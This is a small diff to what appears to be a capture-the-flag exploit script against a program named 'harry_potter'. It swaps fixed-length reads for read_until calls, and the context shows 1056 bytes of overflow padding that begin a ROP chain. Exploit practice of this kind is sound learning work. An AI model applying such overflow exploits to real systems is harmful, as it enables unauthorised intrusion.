@@ -73,7 +73,8 @@ class Harry(p.Manipulator):
         else:
             c = p.Connection(exe="./harry_potter")
 
-        c.read(len('If you guess the password, I will give you a reward!\n'))
+        #c.read(len('If you guess the password, I will give you a reward!\n'))
+        c.read_until('reward!\n')
 
         # padding
         rop = 'A' * 1056
@@ -94,7 +95,8 @@ class Harry(p.Manipulator):
         #if self.host != 'filename':
         c.shutdown(socket.SHUT_WR)
         #else: out_f.close()
-        c.read(len('EXCEPTION: Error during read\n'))
+        #c.read(len('EXCEPTION: Error during read\n'))
+        c.read_until('read\n')
 
         r = c.recv(8192)
         #r = in_f.read()
